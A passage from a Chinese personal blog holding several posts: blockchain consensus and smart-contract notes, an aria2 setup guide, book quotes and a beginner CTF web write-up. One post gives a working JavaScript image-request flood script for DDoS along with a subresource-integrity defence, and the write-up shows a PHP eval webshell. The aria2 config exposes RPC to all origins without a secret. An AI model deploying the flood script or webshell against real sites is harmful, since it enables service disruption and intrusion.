checkpoint。checkpoint的最大目的时减少内存占用。 当检查点被证明是稳定后，节点会把本地消息日志中的消息中客户端请求序列号小于或者等于 n 的消息（pre-prepare、prepare、commit 消息）都删掉。同时，它会删掉旧的检查点和 checkpoint 消息。 RAFTRAFT最初是一个用于管理复制日志的共识算法，它是一个为真实世界应用建立的协议，主要注重协议的落地性和可理解性，RAFT是在非拜占庭故障下达成共识的强一致协议 Raft算法包含三种角色，分别是：跟随者（follower），候选人（candidate）和领导者（leader）。一个节点在某一时刻只能是这三种状态的其中一种，这三种角色是可以随着时间和条件的变化而互相转换的。 所有的节点初始状态都为follower，超时未收到心跳包的follower将变身candidate并广播投票请求，获得多数投票的节点将化身leader，这一轮投票的过程是谁先发出谁有利，每个节点只会给出一次投票，leader节点周期性给其他节点发送心跳包，leader节点失效将会引发新一轮的投票过程。 Raft阶段主要分为两个，首先是leader选举过程，然后在选举出来的leader基础上进行正常操作，比如日志复制、记账等。 关于RAFT的较详细的动画，可访问 http://thesecretlivesofdata.com/raft/ 选举流程1234567RAFT的leader选举流程： 1）任何一个服务器都可以成为一个候选者candidate，它向其他服务器follower发出要求选举自己的请求。2）其他服务器同意了，发出OK。注意，如果在这个过程中，有一个follower宕机，没有收到请求选举的要求，此时候选者可以自己选自己，只要达到N/2+1的大多数票，候选人还是可以成为leader的。3）这样这个候选者就成为了leader领导人，它可以向选民也就是follower发出指令，比如进行记账。4）以后通过心跳进行记账的通知。5）一旦这个leader崩溃了，那么follower中有一个成为候选者，并发出邀票选举。6）follower同意后，其成为leader，继续承担记账等指导工作。 记账过程123456Raft的记账过程按以下步骤完成：1）假设leader领导人已经选出，这时客户端发出增加一个日志的要求；2）leader要求follower遵从他的指令，都将这个新的日志内容追加到他们各自日志中；3）大多数follower服务器将交易记录写入账本后，确认追加成功，发出确认成功信息；4）在下一个心跳中，leader会通知所有follower更新确认的项目。对于每个新的交易记录，重复上述过程 RAFT和PBFT对比一个团队一定会有一个老大和普通成员。对于raft算法，共识过程就是：只要老大还没挂，老大说什么，我们（团队普通成员）就做什么，坚决执行。那什么时候重新老大呢？只有当老大挂了才重选老大，不然生是老大的人，死是老大的鬼。 对于pbft算法，共识过程就是：老大向我发送命令时，当我认为老大的命令是有问题时，我会拒绝执行。就算我认为老大的命令是对的，我还会问下团队的其它成员老大的命令是否是对的，只有大多数人（2f+1）都认为老大的命令是对的时候，我才会去执行命令。那什么时候重选老大呢？老大挂了当然要重选，如果大多数人都认为老大不称职或者有问题时，我们也会重新选择老大。 1.raft算法从节点不会拒绝主节点的请求，而pbft算法从节点在某些情况下会拒绝主节点的请求 ; 2.raft算法只能容错故障节点，并且最大容错节点数为（n-1）/2，而pbft算法能容错故障节点和作恶节点，最大容错节点数为（n-1）/3。 区块链架构比特币区块链1.0区块链1.0是可编程货币，是与转账、汇款和数字化支付相关的密码学货币应用，目标是实现货币的去中心化与支付手段。比特币是区块链1.0最典型的代表, 区块链的发展催生了大量的货币交易平台，实现了货币的部分职能，能够实现货品交易。 比特币钱包： 移动钱包 桌面钱包 互联网钱包 纸钱包 优势 利于并行 可回溯 避免数据膨胀 缺点 查余额时必须回溯查询一大堆交易信息，浪费大量时间和资源 以太坊区块链2.0区块链2.0是可编程金融，是经济、市场和金融领域的区块链应用，核心理念是把区块链作为一个可编程的分布式信用基础设施，支撑智能合约应用，以与过去比特币区块链作为一个虚拟货币支撑平台区别开来。 以太坊：数字代币，基于智能合约 以太坊架构如上 比特币 以太坊 账户设计 无账户的概念，每个账户的余额都是从他们在区块链上的UTXO计算出来的 拥有外部账户和合约账户，外部账户为用户账户，由私钥控制。合约账户是一种可编程账户，受代码控制并由外部账户激活 区块链设计 采用Merkle树将交易的哈希值组成二叉树状结构，顶层节点的哈希值用来校验交易清单 采用Merkle Patricia树来实现对交易和状态的校验和查询。 计算和图灵完备 非图灵完备 图灵完备 EVM高级语言 不提供高级语言支持 提供Solidity、Serpent、LLL等高级语言让用户编写智能合约，高级语言会编译成在EVM中执行的EVM字节码 P2P网络 比特币P2P协议 创建引入RLPx与Whisper网络协议，RLPx协议主要功能是在节点间建立通信并维持通信；Whisper协议主要用于Dapp之间的通信。以太坊P2P网络实现了更多功能扩展 事件 无事件概念 以太坊中的事件是一个以太坊日志和事件监测的协议的抽象。日志的记录中提供合约的地址；事件利用现有的ABI功能来解析日志记录 共识机制 采用PoW机制，依靠的是CPU计算难度问题 对比特币PoW机制进行改进，加入内存难度，具有抵抗单凭哈希运算优化的ASIC挖矿机的属性，以太坊未来将采用PoS共识机制 以太坊客户端较为流行的是go-Ethereum和Parity 两种账户类型：外部持有账户（EOA）和合约账户（CA） 外部账号可以调用合约账户 以太坊中的世界状态定义为以太坊区块链中的全局状态，表示为以太坊地址和账户状态之间的映射。 u账户状态由4个字段组成: nonce：当每次从地址发送交易时，该值递增。在合约账户中，该值代表账户创建的合约数量。 balance:账户余额。ether也认为是以太币的单位，另一个常用的单位是wei。 storageroot：代表Merkle Patricia树的根节点,并对账户的存储内容进行编码。（合约账户） codehash:作为一个不可变字段,包含了与账户关联的智能合约代码的哈希值。在普通账户中,该字段包含一个空字符串的 Keccak 256位哈希值。另外,代码通过一个消息调用而被调用。 智能合约定义：广义的智能合约是一种安全的、处于运行状态的计算机程序 ，体现了一种自动执行以及强制执行的协议。 狭义上讲，智能合约就是存储在区块链上的代码，用以实现执行特定的功能；能根据预先任意制定的规则来自动转移数字资产的系统。 智能合约有以下属性 自动执行 强制执行 明确的语义 安全性和不可阻止性 ​ 智能合约实际上是采用某种语言编写的、计算机或目标可理解的计算机程序.此外，智能合约还包含了以业务逻辑形式出现的各方之间的协议.另一个核心理念是，当某些条件满足时，智能契约将自动执行.另外，强制性意味着所有的合约条款都是按照规定和预期执行的，对于攻击者而言同样如此. ​ 智能合约还具备安全性以及“不可阻挡”性，也就是说，计算机程序必须以这样一种方式设计：在合理的时间范围内具备容错能力并保持执行状态，即使外部因素处于不利状态下，相关程序也应能够执行和维护一个健康的内部状态. ​ 智能合约应该具备确定性.据此，网络上的任何节点运行同一个智能合约，并获得相同的结果.如果最终结果在节点之间略有不同，那么将无法达成共识，因此，区块链上分布式共识的整个范例可能会失效. 智能合约的优点： 高效的实时更新 准确执行 较低的人为干预风险 去中心化权威 较低的运行成本 智能合约的缺点： 漏洞无法修复 隐私保护风险 缺乏有效监管 无法完全实施 智能合约The DAO事件：DAO是最高的众筹项目之一，于2016年4月启动 DAO遭受攻击后，创建了硬分叉用于修复，但违背了去中心化的理念。 以太坊虚拟机以太坊虚拟机时以太网上智能合约的运行环境 特点有①高度脚本化的设计语言使得智能合约的开发更简单；②和以太坊区块链一样同时存储于各个节点计算机上；③简单式堆栈架构，可应用于256位的Keccak散列算法和椭圆曲线计算；④可处理异常执行，包括堆栈溢出和无效指令等；⑤图灵完备，支持任何种类的计算，代码执行受参数Gas的严格制约。 智能合约的使用步骤①编译合约===&gt;&gt;&gt;②创建合约===&gt;&gt;&gt;③部署合约===&gt;&gt;&gt;④调用合约===&gt;&gt;&gt;⑤监听合约||⑤销毁合约； 编译智能合约以太坊上的合约就是一段可以被虚拟机执行的代码，这些代码以以太坊特有的二进制的形式存储在区块链上，并由以太坊虚拟机解释，因此被称为以太坊虚拟机位码。目前，用于以太坊智能合约开发的语言主要由Solidity、Serpent、LLL。 Solidity作为最流行的智能合约语言， 以其简单易用和高可读性受到以太坊设计者们的推荐 创建智能合约创建合约，需要输入合约名称，合约版本号、合约创建者、合约的内容等 部署智能合约部署合约就是将编译好的合约字节码通过外部账户发送交易的形式部署到以太坊区块链上，部署合约时，需要支付费用，要确保账户里有足够的余额（可以创建自己独立的测试网络，即自己的区块链，初始化的时候就可以初始化一些有余额的账户）。部署合约的一般流程： ①输入命令，部署合约； ②查看交易池待处理状况，如有待确认的交易，查看交易内容； ③查看挖矿日志，检验交易是否已发送到以太坊区块链上； ④等待矿工确认，利用txpool.status命令查看交易池状态； ⑤利用eth.getblock命令查看区块中是否含有关于合约的交易。 调用智能合约智能合约的调用需要两个字段：和约地址（表明调用哪个合约）和合约abi(application binaryinterface)（表明具体用合约的哪个方法） 原因：首先，合约内容是可以完全重复的，所以我们根据合约名字、合约内容或者合约内容的哈希，去调用某一个合约都是可能重复的，只有合约地址是不会重复的。另外，合约内的函数名是可以重载的，就是说我们可以有多个叫setValue的函数，但是所需要的传入参数不同。EVM中使用了abi，便于调用，同时还能区分不同的函数。调用合约的一般流程： ①利用eth.contract来定义一个合约类，定义的合约类遵循ABI定义，构建合约实例 ②调用合约 监听智能合约合约部署后，可设置监听，既可以实时监控事件，也可以从历史区块中检索 event。 销毁智能合约合约也可以结束，当一个合约通过kill方法将其杀死，那么我们将不能再和这个合约进行交互，如果一个合约被销毁，那么当前地址指向的是一个僵尸对象，这个僵尸对象调用任何方法都会抛出异常。此时需要调用selfdestruct(address)才能将其进行销毁。 需要指出的是只有拥有者才能销毁合约。 应用场景数字身份智能合约可以允许个人拥有并且控制包含数据、信誉和数字资产在内的数字身份。它允许个人自己决定向对手公开的数据内容，更为企业提供无缝了解客户的机会。 交易对手将不能获取敏感数据来验证交易。这减少了责任，同时促进了解你的客户法规（KYC）要求的无摩擦化，还提高了合规性，可恢复性和互操作性。 记录智能合同可以将统一商业代码（Uniform Commercial Code，UCC）归档数字化，并且自动更新发布流程。他们还可以自动地完善贷款人的贷款担保物权。它们可以自动遵守在将来销毁所要求记录的规则。不仅如此，还能通过UCC留置权自动解锁，自动更新或自动请求抵押品。在执行此类功能时，智能合同能够降低法律成本。 证券智能合约可以简化资本构成表的管理。它们还绕开证券托管链中的中间人，并促进自动支付股息，股票分拆和负债管理，同时降低操作风险。智能合约能将分布式账本上证券的工作流程数字化。 贸易金融智能合约可以通过快速信用证和贸易支付开启来简化国际货物转移，同时获得更大的金融资产的流动性，提高买家，供应商和机构的融资效率。此外，政府必须确定在执行失败的情况下，特别是在纠纷和违约的情况下，法律应当如何界定责任。 对于贸易金融而言，结算系统、技术要求和离散生态系统的整合是重要的三元素。 供应链智能合约可以让供应链中的每一步变得实时可见。互联网设备可以将产品从工厂车间转移到商店货架之间的每个步骤都记录下来。它们促进粒度级别的库存跟踪，这有利于保护供应链的融资、保险和风险。这种增强的跟踪和验证技术降低了盗窃和欺诈的风险。如果想让智能合约实现大规模应用，供应链参与者必须证明其身份，包括公司，机构，个人，传感器，设施和产品等。 汽车保险智能合约可以改善目前混乱的汽车投保及赔付流程。智能合约可以记录相关政策、驾驶记录和驾驶员报告，允许互联网车辆在发生事故后立即执行索赔。合约能够自动处理索赔，验证和付款过程。每个投保人的存储库中都包括了驾驶记录，车辆和事故报告历史。消除重复的报告也会节省成本。不过，这些都需要跨行业协作来解决技术，监管和财务上的挑战。 P2Pp2p简介定义： 网络的参与者共享他们所拥有的一部分硬件资源（处理能力、存储能力、网络连接能力、打印机等），这些共享资源通过网络提供服务和内容，能被其它对等节点(Peer)直接访问而无需经过中间实体。在此网络中的参与者既是资源（服务和内容）提供者（Server），又是资源获取者（Client）。 P2P网络原理从计算模式上来说，P2P打破了传统的Client/Server (C/S)模式，在网络中的每个结点的地位都是对等的。每个结点既充当服务器，为其他结点提供服务，同时也享用其他结点提供的服务。 P2P改变了目前互联网中占主导地位的客户/服务器结构中信息在消费者和生产者之间的不平衡。由于P2P网络没有中心节点（中心服务器），网络中的每个节点具有信息消费者和信息提供者的双重身份P2P，同时具有信息通信方面的功能，因此P2P应用的实现扩展性强，实现方式灵活多样，部署成本低，给互联网的发布和共享带来了巨大的空间。 P2P特点 P2P是动态的：动态地提供信息和服务 P2P是双向的：切实实现信息和服务的交换与共享 P2P是直接的：无中介、等级和格式限制，直接交换信息和服务 P2P是平等的：生产者与消费者地位平等，角色合二为一 P2P是及时的：无服务器参与空间分配，可提供实时、可升级的信息 P2P是有效的：可充分利用个人计算机的硬件设备、传输信息和服务时目标确定 P2P优势 非中心化 网络中的资源和服务分散在所有节点上，信息传输和服务的实现都直接在节点之间进行，可以无需中间环节和服务器的介入，避免了可能的瓶颈。 可扩展性 在P2P网络中，节点在获取其他节点资源的同时也为其他节点服务。随着用户的加入，不仅服务的需求增加了，系统整体的资源和服务能力也在同步扩充，始终能较便捷地满足用户的需求。 健壮性 P2P网络通常都是以自组织的方式建立起来的，并允许节点自由地加入和离开。由于服务是分散在各个节点之间进行的，当部分节点或网络遭到破坏时，对其他部分的影响很小。 高性价比 采用P2P架构可以有效地利用互联网中散步的大量普通节点，将计算任务或存储资料分布到所有节点上，利用其中空置的计算能力或存储空间达到高性能计算和海量存储的目的。 隐私保护 在P2P中，所有参与者可以提供中继转发的功能，因此大大提高了匿名通信的灵活性和可靠性，能够为用户提供更好的隐私保护。 负载均衡 在P2P网络环境下由于每个节点既是服务器又是客户端，减少了对传统C/S结构中服务器计算能力、存储能力的要求，同时由于资源分布在多个节点，因此能更好地实现整个网络的负载均衡。 P2P加密 文件内容共享和下载，例如Napster、Gnutella、eDonkey等 计算能力和存储共享，例如SETI@home、Avaki等 基于P2P技术的协同与服务共享平台，例如JXTA等 即时通讯工具，包括ICQ、QQ、Yahoo Messenger等 P2P通讯与信息共享，例如Skype、Crowds、Onion Routing等； 基于P2P技术的网络电视：沸点、PPStream、 PPLive、 QQLive、 SopCast等。 拓扑结构拓扑结构是指分布式系统中各个计算单元之间的物理或逻辑的互联关系，结点之间的拓扑结构一直是确定系统类型的重要依据。 P2P网络的拓扑结构 根据结构关系可以将P2P系统细分为四种拓扑形式： 中心化拓扑（Centralized Topology） 全分布式非结构化拓扑（Decentralized Unstructured Topology） 全分布式结构化拓扑（Decentralized Structured Topology，也称作DHT网络） 半分布式拓扑（Partially Decentralized Topology） 中心化拓扑结构即存在一个中心节点保存了其他所有节点的索引信息，索引信息一般包括IP地址、端口、节点资源等。 Napster是最早出现的P2P系统之一，它的工作原理如图所示。当某个用户需要某个音乐文件时，首先连接到Napster中央索引服务器，在服务器上进行检索，服务器返回存有该文件的用户信息，再由请求者直接连到文件的所有者传输文件。Napster首先实现了文件查询与文件传输的分离，有效地节省了中央服务器的带宽消耗，减少了系统的文件传输延时。 优点 维护简单、资源发现效率高 缺点 中央索引服务器的瘫痪容易导致整个网络的崩溃，因此可靠性和安全性较低。 随着网络规模的扩大，对中央索引服务器进行维护和更新的费用将急剧增加，所需成本较高。 中央索引服务器的存在常引起版权问题上的纠纷，服务提供商容易被追究法律责任。]]></content>
      <categories>
        <category>BlockChain</category>
      </categories>
      <tags>
        <tag>StudyNote</tag>
        <tag>BlockChain</tag>
        <tag>bitcoin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDoS-JavaScript]]></title>
    <url>%2F2019%2F12%2F12%2FDDoS-Javascript%2F</url>
    <content type="text"><![CDATA[关于JavaScript的DDoS攻击 引用： https://www.freebuf.com/news/66447.html 该攻击属于应用层攻击 Javascript实现DDos攻击原理分析 现在网站的交互性都是通过JavaScript来实现的。通过添加JavaScript直接插入HTML元素，或通过远程来加载JavaScript。浏览器会读取script标签中的src属性并运行它所指向的脚本，其实不只是script标签可以用来攻击，简单来说只要是可以跨域访问的标签，如img，link等都可以实现DDos攻击。 既然这些标签可以访问外站的资源，那么我们是不是就可以设个定时器无限访问这个网站，从而达到攻击呢，那是肯定的。 如果攻击者在一个网站中嵌入了恶意JavaScript脚本，那么该网站的每一个访客都将成为DDoS攻击中的一员。网站流量越高就意味着DDoS越严重。 入侵共享JavaScript的第三方服务器 许多网站使用的都是普通的JavaScript库，为了节约带宽、提升性能，通常还会将JavaScript脚本共享在第三方服务器上。也就是说如果网站上包含有指向第三方服务器的脚本标签，就意味着所有访问该网站的用户都将自动下载JavaScript脚本，并执行。不幸的是，如果攻击者入侵了该第三方服务器并在JavaScript脚本中注入了DDoS攻击代码，那结果可想而知了，所有的访客也将变成DDoS攻击中的一员。 一段简单的JS代码就能发起DoS攻击 12345678910111213141516171819&lt;head&gt;&lt;script type='text/javascript'&gt;function imgflood()&#123;4//var TARGET = 'victim-website.com'4var TARGET = "127.0.0.1:12345"4var URI = '/index?'4var pic = new Image()4var rand = Math.floor(Math.random()*1000)4pic.src = 'http://'+TARGET+URI+'val='+rand4//pic.src = 'http://'+TARGET+URI+'val='+rand&#125;setInterval(imgflood, 10)alert(pic.src)&lt;/script&gt;&lt;/head&gt;&lt;body&gt;f*********************king&lt;script type='text/javascript'&gt;imgflood()&lt;/script&gt;&lt;/body&gt; setInterval(code, millisec):以millisec 毫秒的间隔执行code 由于大部分网页引用jquery是从外部引用的，因此可以从此发起中间人攻击 1&lt;script src="https://code.jquery.com/jquery-1.10.2.min.js"&gt; 预防的话，就是通过script标签支持的属性integrity：这个属性支持验证该js脚本的hash值，确保不会引用来自外部恶意的js脚本 123&lt;script src="https://code.jquery.com/jquery-1.10.2.min.js" integrity="sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg=" crossorigin="anonymous"&gt; 中间人攻击示意图：攻击其中的请求外部js的途径 在写js-DDoS的问题： HTML引入外部js脚本，放在head中不起作用,放在body中才起作用这是因为加载HTML文档时，先加载了js脚本后就不起作用了。一般引入外部css文件放在head中，引入外部js脚本放在body中。先渲染HTML文档(css)，再加载特效(js)]]></content>
      <categories>
        <category>DDoS</category>
      </categories>
      <tags>
        <tag>DDoS</tag>
        <tag>Network</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tricks]]></title>
    <url>%2F2019%2F12%2F01%2Ftricks%2F</url>
    <content type="text"><![CDATA[To record some strange tricksPython1.something about math.log如图，当math.log(125,5)时应该值为3的，但是出了一个bug 好奇心驱使我去写一个脚本看看，然后发现这些能hack math.log函数的不在少数 12345for i in range(2,101):4for j in range(100):44ij = i**j if math.log(ij, i) != j: print(i,'\t',j) 然后去ubuntu虚拟机尝试了python2，发现也有这个问题 看了官方文档，发现有底数的对数函数是通过换底公式实现的，统一换成以e为底的对数去计算，因此会有除法的溢出导致以上问题。 math.`log`(x[, base]) With one argument, return the natural logarithm of x (to base e). With two arguments, return the logarithm of x to the given base, calculated as log(x)/log(base). 1math.log(x[,base]) = log(x) / log(base) 哪怕是math.log(x**y,x)也会有这个问题。 最有力的证明：]]></content>
  </entry>
  <entry>
    <title><![CDATA[aria2]]></title>
    <url>%2F2019%2F11%2F27%2Faria2%2F</url>
    <content type="text"><![CDATA[Aria2 参考： aria2 aria2 manual github-aria2 Windows 下如何配置 Aria 2 AriaNg 强大的 Aria2 Web 端 安装及使用 webui配置： YAAW AriaNg 由于不想下载可爱的迅雷，于是搜索搜索就得到了这个下载工具——Aria2 这东西不仅可以当作下载器，而且可以支持各种协议，包括bt等等 安装步骤1.进入官方页面 Aria2，也可以去官方github的项目地址 https://github.com/aria2/aria2/releases/tag/release-1.35.0 下载release包，也可以下源码自己编译。 2.下载之后解压至目录下，然后再该目录下新建以下4个文件 Aria2.log：日志，空文件即可 aria2.session：下载历史，空文件即可 aria2.conf：配置文件 run.bat or run.vbs：用于自动启动或隐藏窗口，可选 Aria2.conf如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118## '#'开头为注释内容, 选项都有相应的注释说明, 根据需要修改 #### 被注释的选项填写的是默认值, 建议在需要修改时再取消注释 #### 文件保存相关 ### 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置dir=aira2/downloads# 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M#disk-cache=32M# 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc# 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc# falloc和trunc则需要文件系统和内核支持# NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项#file-allocation=none# 断点续传continue=truelog=aria2/aria2.log## 下载连接相关 ### 最大同时下载任务数, 运行时可修改, 默认:5#max-concurrent-downloads=5# 同一服务器连接数, 添加时可指定, 默认:1max-connection-per-server=5# 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M# 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载min-split-size=10M# 单个任务最大线程数, 添加时可指定, 默认:5#split=5# 整体下载速度限制, 运行时可修改, 默认:0#max-overall-download-limit=0# 单个任务下载速度限制, 默认:0#max-download-limit=0# 整体上传速度限制, 运行时可修改, 默认:0#max-overall-upload-limit=0# 单个任务上传速度限制, 默认:0#max-upload-limit=0# 禁用IPv6, 默认:false#disable-ipv6=true# 连接超时时间, 默认:60#timeout=60# 最大重试次数, 设置为0表示不限制重试次数, 默认:5#max-tries=5# 设置重试等待的秒数, 默认:0#retry-wait=0## 进度保存相关 ### 从会话文件中读取下载任务input-file=aria2/aria2.session# 在Aria2退出时保存`错误/未完成`的下载任务到会话文件save-session=aria2/aria2.session# 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0#save-session-interval=60## RPC相关设置 ### 启用RPC, 默认:falseenable-rpc=true# 允许所有来源, 默认:falserpc-allow-origin-all=true# 允许非外部访问, 默认:falserpc-listen-all=true# 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同#event-poll=select# RPC监听端口, 端口被占用时可以修改, 默认:6800#rpc-listen-port=6800# 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项#rpc-secret=&lt;TOKEN&gt;# 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-user=&lt;USER&gt;# 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-passwd=&lt;PASSWD&gt;# 是否启用 RPC 服务的 SSL/TLS 加密,# 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接#rpc-secure=true# 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,# 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥#rpc-certificate=/path/to/certificate.pem# 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件#rpc-private-key=/path/to/certificate.key## BT/PT下载相关 ### 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true#follow-torrent=true# BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999listen-port=51413# 单个种子最大连接数, 默认:55#bt-max-peers=55# 打开DHT功能, PT需要禁用, 默认:trueenable-dht=false# 打开IPv6 DHT功能, PT需要禁用#enable-dht6=false# DHT网络监听端口, 默认:6881-6999#dht-listen-port=6881-6999# 本地节点查找, PT需要禁用, 默认:false#bt-enable-lpd=false# 种子交换, PT需要禁用, 默认:trueenable-peer-exchange=false# 每个种子限速, 对少种的PT很有用, 默认:50K#bt-request-peer-speed-limit=50K# 客户端伪装, PT需要peer-id-prefix=-TR2770-user-agent=Transmission/2.77peer-agent=Transmission/2.77# 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0seed-ratio=0# 强制保存会话, 即使任务已经完成, 默认:false# 较新的版本开启后会在任务完成后依然保留.aria2文件#force-save=false# BT校验相关, 默认:true#bt-hash-check-seed=true# 继续之前的BT任务时, 无需再次校验, 默认:falsebt-seed-unverified=true# 保存磁力链接元数据为种子文件(.torrent文件), 默认:falsebt-save-metadata=true 注意修改以下选项： dir=\path\to\Download\ （下载文件保存路径，改为你想要的） log=\path\to\Aria2\Aria2.log （日志文件，路径D:\App\Aria2\改为你安装aria2的路径） input-file=\path\to\Aria2\aria2.session save-session=\path\to\Aria2\aria2.session 以下是可以自动隐藏运行aria2的脚本 1CreateObject("WScript.Shell").Run "D:\App\Aria2\aria2c.exe --conf-path=aria2.conf",0 3. 管理Aria 2 下载任务 首先我们要打开Aria2 的WebUI，即YAWW或者AriaNg 然后再页面的设置中将JSON-RPC Path设置为http://localhost:6800/jsonrpc 点保存，即可。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Le Petit Prince Note]]></title>
    <url>%2F2019%2F11%2F26%2FLe-Petit-Prince-Note%2F</url>
    <content type="text"><![CDATA[Le Petit Prince小王子 希望我能如小王子一样，被一朵玫瑰所驯化~ 希望我下次再读这本书时会有不一样的感受把。 我告诉你这么多有关B612号小行星的事情，让你知道它的编号，是因为大人。大人热爱数字。…… 如果有人爱上一朵花，天上的星星有亿万颗，而这朵花只长在其中一颗上，这足以让他再仰望夜空时感到很快乐。他会告诉自己：“在星空的某处有我的花。” 可惜从前我什么都不懂！我应该看着她的行动，而不是听她的言语！她为我散发芬芳，点亮我的生活。我不应该离开她的，我应该看出藏在她那些后面的柔情。花儿的心事好难捉摸的！当时我太小了，不懂得爱是什么。 “那你可以审判自己，”国王回答说，“这是最难的。审判自己比审判别人难得多。如果你能正确地审判自己，那你就是真正的聪明人”、 看东西只有用心才能看得清楚，重要的东西用眼睛看不见的。 正是你为你的玫瑰付出的时间，使得你的玫瑰是如此的重要。]]></content>
      <categories>
        <category>Reading</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SDUCTF2019-wp]]></title>
    <url>%2F2019%2F11%2F15%2FSDUCTF2019-wp%2F</url>
    <content type="text"><![CDATA[SDUCTF2019-WriteUp刚入门了ctf2周，便有新生赛玩，真好。 PS.刚准备写wp又放出来一题QAQ ！！！写wp一半又放出题目 说好的周六早上放题的，结果早上起来一脸懵逼 校园网下pwntools下到崩溃啊啊啊啊啊 Web0x01 最简答的Web题 题目描述：flag就在html里面，右键点击查看源代码即可查看 直接F12查看源码，找到flag 0x02 按钮点击 题目描述： 想方设法点击按钮 进入页面一个灰色的按钮，F12查看源码 删除button标签里的disabled即可点击按钮 1&lt;input style="width: 150px; height: 60px; font-size: 30px;" type="button" onclick="c()" value="flag" disabled=""&gt; 后面好奇，发现flag就在click2.js里，被base64加密过 0x03 量子波动速读 题目描述： 你会量子波动速读吗？ 进入页面就一个按钮，点击查看，发现一闪而过的fakeflag 123&lt;button onclick="window.location.href = 'flag_is_here.html'"&gt; 点击查看flag&lt;/button&gt; 源码如上，输入url/flag_is_here.html发现就是刚才一闪而过的页面 利用burpsuite抓包即可，因为所有请求被burpsuite拦截，所以可以看到/flag_is_here.html但是页面上给的是fake ctf，明显不是flag，查看源码得到flag，我是直接用repeater发一个包获得Response。 0x04 芝麻开门 题目描述： 简单的提交，芝麻开门 直接复制题目的zhimakaimen进去，返回的是口令错误 查看burpsuite拦截的包，好像是因为他的输入框有长度限制，所以少了一个字母 利用burpsuite的repeater重新发一个完整的包，得到flag 0x05 Funny Button 题目描述： 有趣的按钮，你能点到吗？ 即示例的题目，删除html的css或js都可以，甚至可以用tab键选中button按钮，点击去就是flag 0x06 曲奇 题目描述： 你喜欢吃曲奇饼干吗？ 曲奇==cookies，直接查看网站cookies即可 flag即在内容里，注意flag要进行url解码 0x07 GET 题目描述： 你就是个没有感情的浏览器 我是一个莫得感情的get机器 0x08 未来浏览器 题目描述： 小王正在追剧《亲爱的，热爱的》，电脑屏幕。。。。（谁帮我编个） 当他再次醒来。。。。。。。 有题目已知，用burpsuite改http头属性User-Agent即可 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/6666.6.6666.66 Safari/537.36 改后发包得到flag 0x09 POST 题目描述： 你就是一个没有感情的浏览器 我只是一个莫得感情的post机器 利用firefox插件HackBar发送post请求，或者用burpsuite也行 0x0a vim好用啊 题目描述： 小明同学用vim编辑主页的时候，实验室断电了！ 由题目得知用vim时断电，用过vim的人都知道，当vim非正常退出时会创建一个保护的缓存文件，现在word也一样。 直接百度搜vim异常退出的备份文件，因为上次做过类似的，试试index.php.bak和index.php~没用，就百度了一下，得知备份文件格式为.index.php.swp，访问url/.index.php.swp下载文件得到.index.php.swp 得知flag在url/vimvimvimvim.php里，果然vim是最好的编辑器（狗头保命 0x0b 一句话木马 题目描述： 听说过一句话木马吗？ 听说过中国菜刀吗？ 听说过中国蚁剑吗？ 快去了解一下吧！！ 看刀&lt;!--php eval(@$_POST[&quot;cmd&quot;]);--&gt;就可知是一句话木马，对这个稍微了解一下，去github获取中国蚁剑即可 不过有一个坑，就是他默认访问是index.php，但是通过中国蚁剑连不上，回头看页面，发现在题目中有一个shell.php，于是尝试url/shell.php加上密码cmd，成功连上得到flag 0x0c 达拉崩吧 题目描述： 达拉崩吧打怪小游戏 进入页面是个小游戏，发现是hackergame2019原题嘤嘤嘤 原题wp： https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9/README.md 在买菜这里，有一个大整数溢出，后续会搞懂这个原理 原理如下： https://blog.csdn.net/zhenghhgz/article/details/78657917 原意是javascript的所有数字，无论整数还是小数，类型都为Number，为64位浮点数。因此，JavaScript中所有的数都是浮点数。遵循IEEE 754标准（浮点数算术标准），JavaScript所能表示的数值范围为正负1.7976931348623157乘以10的308次方，其最小所能表示的小数为正负5乘以10的负324次方，这两个边界值可以分别通过访问Number对象的MAX_VALUE属性和MIN_VALUE属性来获取。 JavaScript能表示并进行精确算术运算的整数范围为：正负2的53次方，也即从最小值-9007199254740992到最大值+9007199254740992之间的范围；对于超过这个范围的整数，JavaScript依旧可以进行运算，但却不保证运算结果的精度。值得注意的是，对于整数的位运算（比如移位等操作），JavaScript仅支持32位整型数，也即从-2147483648到+2147483647之间的整数。 然后得到flag 0x0d HTTP头 题目描述： 你了解http头吗？ 根据题目，直接查看http Response Headers 得到flag：F1ag: flag{096b5778-cf23-4f03-8c45-2505b7670b89} 0x0e robots 题目描述： 你听说过robots协议吗？他可是每个机器人都需要遵守的协议啊！（笑话） 由题目知，robots是一个限制爬虫的东西，直接访问url/robots.txt 123User-agent: *Disallow: /Disallow: f1ag_1s_h3re.php 